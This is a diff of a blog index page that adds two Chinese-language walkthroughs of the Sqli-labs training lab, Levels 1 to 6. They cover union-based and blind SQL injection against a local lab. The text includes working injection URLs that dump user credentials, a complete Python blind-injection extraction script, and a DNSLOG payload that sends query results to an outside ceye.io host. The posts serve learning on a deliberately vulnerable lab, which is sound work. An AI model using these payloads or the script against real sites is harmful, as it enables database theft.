@@ -236,6 +236,577 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" itemprop="url">Sqli-labs Blind injection Less5-6</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T08:15:41+08:00">
+                2018-10-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。</p>
+</blockquote>
+<hr>
+<p>##<strong>MID(源字符串,开始位置,截取长度)</strong><br>    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>MID(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位，<code>MID(DATABASE(),2,1)</code>查看数据库名第二位，依次查看各位字符。</p>
+<p>B.<code>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
+<p>##<strong>substr(源字符串,开始位置,截取长度)</strong><br>substr与mid substring的用法类似<br>str = ‘123456’  substr(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>substr(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>MID(DATABASE(),2,1)</code>查看数据库名第二位,依次查看各位字符。</p>
+<p>B.<code>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
+<p>##<strong>left(源字符串,截取长度)</strong><br>left得到字符串从左开始指定个数的字符串<br>str = ‘123456’  left(str,3) 结果为123<br><strong>SQL用例</strong>：<br>A.<code>left(database(),1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>left(database(),2)&gt;&#39;ab&#39;</code>,查看数据库名前二位。</p>
+<p>B.<code>left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
+<hr>
+<p>再介绍一<code>下ascii()</code>与<code>ord()</code>函数,这两个函数经常与上面的截取函数连用。<br>因为mysql默认是不对大小写敏感的,所以为了保证结果准确,我们就需要将字符转为其对应的ascii码值进行比较</p>
+<p>用法:<code>ASCII(str1) ord(str1)</code> 都是返回字符串的第一个字符的ASCII码值</p>
+<p><strong>SQL用例</strong>：</p>
+<pre><code>猜解数据库名第一位的ascii码值是否为97 (即字符a)
+ascii(substr(database(),1,1))=97 
+ord(mid(database(),1,1))=97  
+</code></pre><p>##<strong>Less-5:</strong><br>经过简单查看页面,这里的正确界面并不会返回用户名与密码,而是返回字符串<code>You are in.....</code><br><img src="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png" alt="image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png-206.3kB"></p>
+<p>加单引号看报错信息:<br><img src="http://static.zybuluo.com/chhyx/1c8lqewwtouvcupqlga4at3v/image_1cqdfu64t2avelb1ugdlh61ssca9.png" alt="image_1cqdfu64t2avelb1ugdlh61ssca9.png-212.9kB"></p>
+<p>我们可以看到我们提交的1’经过sql语句处理变成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1</code> 所以我们可以猜测后台代码是这样写的:<code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;</code><br>这里我们就需要闭合掉单引号</p>
+<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=1--+
+http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=2--+
+</code></pre><p>这里正确会返回You are in…… 错误返回空</p>
+<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
+<p>猜解数据库长度:</p>
+<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;7--+
+http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;8--+
+</code></pre><p>说明数据库长度为8</p>
+<p>猜解数据库名:</p>
+<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and ascii(substr((database()),1,1))=115--+
+</code></pre><p>这里用burp简单测试一下,发现<code>ascii码</code>值为115返回正确页面, 猜解出第一位为s<br><img src="http://static.zybuluo.com/chhyx/2887km8ounik96ogys2wymx9/image_1cqfqlru4kvm10nj4vh16sl17c19.png" alt="image_1cqfqlru4kvm10nj4vh16sl17c19.png-63.9kB"><br>改变<code>substr</code>的第二个参数,至到数据库名全部猜解。（security）</p>
+<p>猜解数据表数量:</p>
+<pre><code>&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)=4--+
+</code></pre><p>得到security数据库共有4张表<br>猜解每个表的长度:</p>
+<pre><code>&apos; and length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))=6--+
+</code></pre><p>猜解数据表名:</p>
+<pre><code>&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=97--+
+</code></pre><p>猜解列个数:</p>
+<pre><code>&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)=4--+
+</code></pre><p>猜解列长度:(改变substr的第二个参数进行猜解)</p>
+<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))--+
+</code></pre><p>猜解列名:</p>
+<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=97--+
+</code></pre><p>然后就是猜解列中的数据了(这里以username列为例)</p>
+<p>猜解<code>username</code>列中的数据量:</p>
+<pre><code>&apos; and (select count(username) from security.users)=13--+;
+</code></pre><p>猜解<code>username</code>列第一条数据的长度:</p>
+<pre><code>&apos; and ascii(substr((select username from security.users limit 0,1),1,1))--+
+</code></pre><p>猜解<code>username</code>列第一条数据的长度</p>
+<pre><code>&apos; and ascii(substr((select username name from security.users limit 0,1),1,1))=97--+
+</code></pre><p>附完整python代码:</p>
+<pre><code># -*- coding: utf-8 -*-
+#author: P0rZ9
+#env: python2 
+#fun: Sqli-labs less5
+
+import requests
+import string
+
+url = &quot;http://127.0.0.1:86/less-5/index.php?id=1&quot;
+str1 = string.letters + string.digits + &quot;_!@#*&quot;
+
+database_name = &quot;&quot;
+table_num = 0
+table_list = []
+column_dic = {}
+column_list = []
+date_list = []
+
+#猜解数据库长度
+print &quot;开始猜解数据库长度......&quot;
+for i in range(30):
+    payload = &quot;&apos; and length(database())={}--+&quot;.format(str(i))
+    re = requests.get(url+payload)
+    #print url+payload
+    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+        database_length = i
+        #print &apos;database_length:%d&apos;%(database_length)
+        break
+print &quot;数据库长度为%s&quot;%(database_length)
+#database_length：8
+
+#猜解数据库名
+print &quot;开始猜解数据库名......&quot;
+for i in range(1,database_length+1):
+    for chr in str1:
+        payload = &quot;&apos; and ascii(substr(database(),{},1))={}--+&quot;.format(str(i),ord(chr)) 
+        re = requests.get(url+payload)
+        #print url+payload
+        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+            database_name += chr
+            break
+        else:
+            pass
+print &quot;数据库名为%s&quot;%(database_name)
+#database_name：security
+
+#猜解数据表个数
+print &quot;开始猜解表的数量......&quot;
+for i in range(30):
+    payload = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)=%s--+&quot;%(database_name,str(i))
+    re = requests.get(url+payload)
+    #print url+payload
+    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+        table_num = i
+        break
+    else:
+        pass
+print &quot;表的数量为:%s&quot;%(str(table_num))
+#table_num:4
+
+
+#表长度及名称
+#表长
+print &quot;开始猜解表名.......&quot;
+for i in range(table_num):
+    table_name = &quot;&quot;
+    for j in range(10):
+        payload = &quot;&apos; and length((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1))=%s--+&quot;%(database_name,str(i),str(j))
+        re = requests.get(url+payload)
+        #print url+payload
+        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+            table_len = j
+            #print table_len
+
+            #表名
+            for k in range(table_len):#6
+                for chr in str1:
+                    payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,str(i),str(k+1),ord(chr))
+                    #print url+payload
+                    re = requests.get(url+payload)
+                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+                        table_name += chr
+                        break
+            #print &quot;%s:%s位&quot;%(table_len,table_name)
+            table_list.append(table_name)
+            break
+print table_list
+#table_list = [&apos;uagents&apos;,&apos;referers&apos;,&apos;emails&apos;,&apos;users&apos;]
+
+
+#字段
+
+#猜解列的个数
+print &quot;开始猜解%s的列个数&quot;%(table_list[-1])
+for i in range(20):
+    payload = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos;)=%s--+&quot;%(database_name,table_list[-1],str(i))
+    re = requests.get(url+payload)
+    #print url+payload
+    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+        column_num = i
+        #print &quot;%s:%s个表&quot;%(table_list[-1],column_num)
+        column_dic.setdefault(table_list[-1],column_num)
+        break
+
+print &quot;%s的列个数为%s&quot;%(table_list[-1],column_dic[&apos;users&apos;])
+#column_dic:{&apos;users&apos;: 3}
+
+
+
+#猜解列的长度及列名
+print &quot;开始猜解%s的列名......&quot;%(table_list[-1])
+
+for i in range(column_dic[table_list[-1]]):#4
+    column_name = &quot;&quot;
+    for j in range(20):
+        payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))--+&quot;%(database_name,table_list[-1],str(i),str(j+1))
+        #print url+payload
+        re = requests.get(url+payload)
+
+        if &apos;You are in&apos; not in re.text and re.status_code == 200:
+            column_len = j
+            #print column_len
+            for k in range(column_len):
+                for chr in str1:
+                    payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,table_list[-1],str(i),str(k+1),ord(chr))
+                    re = requests.get(url+payload)
+                    #print url+payload
+                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+                        column_name += chr
+                        break
+
+            print column_name
+            column_list.append(column_name)
+            break
+print &quot;%s表有%s字段,分别为:%s&quot;%(table_list[-1],column_dic[table_list[-1]],column_list)
+#column_list = [&apos;id&apos;,&apos;username&apos;,&apos;password&apos;]
+
+
+
+
+print &quot;开始猜解%s表的数据量.......&quot;%(table_list[-1])
+for i in range(20):
+    payload = &quot;&apos; and (select count(%s) from %s)=%s--+;&quot;%(column_list[1],table_list[-1],str(i))
+    re = requests.get(url+payload)
+    #print url+payload
+    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+        data_num = i
+        break
+print &quot;得到%s表的数据量为%s组&quot;%(table_list[-1],str(data_num))
+#data_num:13
+
+print &quot;开始猜解%s表的%s列的数据.......&quot;%(table_list[-1],column_list[1])
+for i in range(data_num):
+    for j in range(20):
+        date_name = &quot;&quot;
+        payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %s,1),%s,1))--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(j+1))
+        re = requests.get(url+payload)
+        #print url+payload
+        if &apos;You are in...........&apos; not in re.text and re.status_code == 200:
+
+            for k in range(j):  #输入每个字符的长度
+                for chr in str1:
+                    payload = &quot;&apos; and ascii(substr((select %s name from %s.%s limit %s,1),%s,1))=%s--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(k+1),str(ord(chr)))
+                    re = requests.get(url+payload)
+                    #print url+payload
+                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
+                        date_name += chr
+                        break
+            date_list.append(date_name)
+            break        
+print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_list)
+</code></pre><p>运行结果:<br><img src="http://static.zybuluo.com/chhyx/2n73z1533r7e7j9spwymv4tt/image_1cqfl19qe1eb21vb11nor1itstknp.png" alt="image_1cqfl19qe1eb21vb11nor1itstknp.png-101kB"></p>
+<p>写这个脚本时主要是为了学习盲注,但是写完发现还有好多可改进的地方,比如没用函数包裹,猜解效率太低(可以考虑使用二分法)。有时间再改吧。</p>
+<p>##<strong>Less-6:</strong><br>加单引号<code>&#39;</code>页面无明显返回:<br><img src="http://static.zybuluo.com/chhyx/742qe6uxv1qzc8q878jbizq2/image_1cqfsnokf112n1pokbbe1m6mn150.png" alt="image_1cqfsnokf112n1pokbbe1m6mn150.png-207.4kB"></p>
+<p>加个双引号<code>&quot;</code>试试:<br><img src="http://static.zybuluo.com/chhyx/7833nzrji74ghcfxxqrck3qj/image_1cqfsl3oa1f15uin13p41gcd9j51j.png" alt="image_1cqfsl3oa1f15uin13p41gcd9j51j.png-214.6kB"></p>
+<p>我们输入的1”变成了’”1”” limit 0,1’ 可发现多了一个双引号 我们注释掉它继续猜解。且我们可猜测后台处理语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;
+</code></pre><p>那我们将Less-5所用payload中的<code>&#39;</code>改为<code>&quot;</code>即可成功利用。</p>
+<p><img src="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png" alt="image_1cqftpsuureu1uh18071tcl1djp9e.png-54.9kB"></p>
+<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
+<p>获取数据库名:</p>
+<pre><code>id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
+</code></pre><p>即可在我们的dns平台查看数据库内容:<br><img src="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png" alt="image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png-46.2kB"></p>
+<p>获取表名：</p>
+<pre><code>&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/1hf0mvtjsayzma47kbr7zuo3/image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png" alt="image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png-99.1kB"></p>
+<p>之后更换我们的SQL语句即可获取数据。这种方式的优点是获取数据快,但是利用的条件相对来说较苛刻。不过在平常的测试中作为一种测试手法还是可以的。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/22/Sqli-labs_Less1-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/22/Sqli-labs_Less1-4/" itemprop="url">Sqli-labs Error Based Sqli Less1-4</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-22T08:15:41+08:00">
+                2018-10-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>项目下载地址:<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>基础部分请参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/SQL注入基础/</a><br><a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/12/mysql基础命令/</a></p>
+<p><strong>Less-1:</strong></p>
+<p>通过更换id观察,可发现程序会通过遍历id获取对应的<code>name</code>与<code>password</code>:<br><img src="http://static.zybuluo.com/chhyx/kwee90sb6uk38mne895liw0u/image_1cqcvjah013o172f1qq9ncld61m.png" alt="image_1cqcvjah013o172f1qq9ncld61m.png-34.3kB"><br><img src="http://static.zybuluo.com/chhyx/19yl78kf7inas5m645h5tbp3/image_1cqcvk5631ij017br11471qk127s13.png" alt="image_1cqcvk5631ij017br11471qk127s13.png-35.5kB"></p>
+<p>加<code>&#39;</code>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/ycj2g4ihotcyr7osq3th27ds/image_1cqd1hmpqpgf1035av8s83rat51.png" alt="image_1cqd1hmpqpgf1035av8s83rat51.png-35.5kB"></p>
+<p>在上述的错误信息中,我们可以看到我们输入的1’在经过sql语句拼接后构成了 <code>&#39;1&#39;&#39; limit 0,1</code> 多加了一个<code>&#39;</code>,那我们可以利用在输入语句最后加注释(–+)的方法将他注释掉。</p>
+<p>查看字段:</p>
+<pre><code>http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 3--+ 正确
+http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 4--+ 错误
+</code></pre><p>说明字段为3,因为<code>order by 3</code> 表示用查询字段中的第3个字段进行排序,而<code>order by 4</code>报错说明不存在第4个字段,表明该表一共具有3个字段。</p>
+<p>判断显示位:</p>
+<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,2,3--+ 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/mem0kwpifpbgx05yeq5s6z7b/image_1cqd00bpc10g5ttl4cb1b58qrh20.png" alt="image_1cqd00bpc10g5ttl4cb1b58qrh20.png-33.9kB"></p>
+<p>使用union时,必须使前面的sql语句查询出错(不存在id=-1的用户),因为只有前面的sql语句结果为空就会显示我们自己构造的SQL语句 即<code>select 1,2,3</code></p>
+<p>爆数据库名(将显示位替换为mysql的信息函数):<br><img src="http://static.zybuluo.com/chhyx/a5shqxuf55lzhsk6s2u1ehwl/image_1cqd07827jru1fnj1mll1slr1s7i2d.png" alt="image_1cqd07827jru1fnj1mll1slr1s7i2d.png-35.7kB"></p>
+<p>表明当前使用的数据库名为<code>security</code> 用户为<code>root@localhost</code></p>
+<p>爆<code>security</code>数据库的所有表名:</p>
+<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3--+ 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/4mdwydzoarb2e96xaerxuur0/image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png" alt="image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png-53.4kB"></p>
+<p>爆<code>users</code>表下的所有字段名:</p>
+<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),3--+ 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/w0hpd6qqop1tqytcw5tr6ntn/image_1cqd0ld8t1dh3ebeeeeeihh5l47.png" alt="image_1cqd0ld8t1dh3ebeeeeeihh5l47.png-46.6kB"></p>
+<p>获取<code>username</code>与<code>password</code>内容:</p>
+<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(username,&apos;:&apos;,password) from security.users),3--+ 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/ond8909uzodpo0f40r9dujth/image_1cqd0q9aj1qbosesl631n8s1u74k.png" alt="image_1cqd0q9aj1qbosesl631n8s1u74k.png-62.1kB"></p>
+<p><code>Less-1</code>源码:</p>
+<pre><code>&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+// take the variables 
+if(isset($_GET[&apos;id&apos;]))
+{
+$id=$_GET[&apos;id&apos;];
+//logging the connection parameters to a file for analysis.
+$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
+fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);
+fclose($fp);
+
+// connectivity 
+
+$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+    if($row)
+    {
+      echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;
+      echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
+      echo &quot;&lt;br&gt;&quot;;
+      echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
+      echo &quot;&lt;/font&gt;&quot;;
+      }
+    else 
+    {
+    echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;
+    print_r(mysql_error());
+    echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+
+?&gt;
+</code></pre><p><code>Less1-Less4</code>都可利用上述<code>union</code>操作进行注入,下面就不再追溯了。</p>
+<p><strong>Less-2:</strong></p>
+<p>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/fqi5jyne11u1ehliyzs0ry7l/image_1cqd1lh8q1d1v76030n10ub9kc5u.png" alt="image_1cqd1lh8q1d1v76030n10ub9kc5u.png-45.2kB"><br>因为报错信息是在<code>limit 0,1</code>附近,猜测后台查询语句为:<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1</code>对id无处理 直接查询。</p>
+<p>查看字段:</p>
+<pre><code>http://127.0.0.1:86/less-2/index.php?id=1 order by 3--+
+http://127.0.0.1:86/less-2/index.php?id=1 order by 4--+
+</code></pre><p>判断显示位:</p>
+<pre><code>http://127.0.0.1:86/less-2/index.php?id=-1 union select 1,2,3--+
+</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
+<p><code>Less-2</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre><p><strong>Less-3:</strong></p>
+<p>报错信息:<br><img src="http://static.zybuluo.com/chhyx/un3nxsfayp67s4breg7c3cl0/image_1cqd1rn40qsg17jj1qre1bq812129q.png" alt="image_1cqd1rn40qsg17jj1qre1bq812129q.png-209.5kB"><br>根据报错信息 这里就需要闭合下单引号与括号了</p>
+<p>查看字段:</p>
+<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 3--+
+http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 4--+
+</code></pre><p>判断显示位:</p>
+<pre><code>http://127.0.0.1:86/less-3/index.php?id=-1&apos;) union select 1,2,3--+
+</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
+<p><code>Less-3</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
+</code></pre><p><strong>Less-4:</strong></p>
+<p>输入单引号发现不报错:<br><img src="http://static.zybuluo.com/chhyx/mmkfe12lisrvwpd525f6er0o/image_1cqd22cokoj87a31vuspo25a0an.png" alt="image_1cqd22cokoj87a31vuspo25a0an.png-60.6kB"></p>
+<p>再次测试双引号 成功报错:<br><img src="http://static.zybuluo.com/chhyx/iz7bh878j9fsrtxt1q7zpq9t/image_1cqd23l5j1lhi7jai3q126a5lsb4.png" alt="image_1cqd23l5j1lhi7jai3q126a5lsb4.png-209.2kB"></p>
+<p>所以这里需要闭合双引号与括号</p>
+<p>查看字段:</p>
+<pre><code>http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 3--+
+http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 4--+
+</code></pre><p>判断显示位:</p>
+<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&quot;) union select 1,2,3--+
+</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
+<p><code>Less-4</code>源码,只列出sql语句部分,剩下的与<code>Less-1</code>相同:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/21/APPCMS详细审计/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1890,508 +2461,6 @@ get_token($data[&apos;PWDHASH&apos;]);
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" itemprop="url">代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-09T09:15:41+08:00">
-                2018-10-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>审计cms：<a href="https://p0rz9.github.io/2018/10/08/74CMS_V4.2.111%E5%A4%9A%E5%A4%84sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:<code>copy()</code>操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码</p>
